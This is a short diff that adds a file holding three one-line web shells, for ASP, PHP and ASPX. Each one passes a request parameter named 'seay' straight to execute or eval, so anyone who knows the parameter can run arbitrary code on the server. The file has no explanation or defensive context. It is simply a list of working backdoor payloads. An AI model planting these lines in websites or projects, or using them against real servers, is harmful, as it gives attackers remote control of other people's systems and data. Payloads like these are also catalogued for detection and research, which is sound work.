@@ -1,0 +1,11 @@
+asp
+
+<%execute(request("seay"))%> 
+
+php
+
+<?php eval($_POST[seay]);?> 
+
+ASPX
+
+<% @Page Language="Jscript"%><%eval(Request.Item["seay"],"unsafe");%>
